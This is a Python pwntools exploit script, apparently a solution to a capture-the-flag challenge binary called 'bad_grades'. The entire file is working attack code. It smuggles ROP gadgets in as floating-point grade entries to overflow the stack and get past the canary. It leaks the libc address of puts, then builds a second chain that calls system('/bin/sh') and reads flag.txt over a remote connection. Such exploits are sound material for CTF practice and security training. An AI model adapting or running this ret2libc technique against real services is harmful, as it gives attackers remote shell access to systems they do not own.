#!/usr/bin/env python3

from pwn import *
import sys

context.arch = "amd64"

def p64_to_double_str(x):
    return str(struct.unpack("<d", x)[0])

def exploit(io, elf, libc):
    
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    puts_got = elf.got["puts"]
    puts_addr = elf.symbols["puts"]
    main_addr = 0x401108
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"grades: ", b"39")
    
    for i in range(35):
        io.sendlineafter(b"]: ", b".")
    
    rop_chain = [pop_rdi, puts_got, puts_addr, main_addr]
    for gadget in rop_chain:
        io.sendlineafter(b"]: ", p64_to_double_str(p64(gadget)).encode())
    
    io.recvline()
    leaked_puts = u64(io.recvuntil("\n").strip().ljust(8,b'\x00'))
    
    libc.address = leaked_puts - libc.symbols["puts"]
    print("libc: ", hex(libc.address)) 
    
    rop = ROP([elf,libc])
    ret = rop.find_gadget(['ret'])[0]
    binsh = next(libc.search(b"/bin/sh"))
    system = libc.symbols["system"]

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"grades: ", b"39")
    
    for i in range(35):
        io.sendlineafter(b"]: ", b".")
    
    rop_chain = [ret, pop_rdi, binsh, system]
    for gadget in rop_chain:
        io.sendlineafter(b"]: ", p64_to_double_str(p64(gadget)).encode())
    
    io.recv()
    io.sendline(b"cat flag.txt")
    print(io.recv().decode())



def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./bad_grades")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)

    elf = ELF("./bad_grades")
    libc = ELF("./libc.so.6")
    exploit(io, elf, libc)

if __name__ == "__main__":
    main()
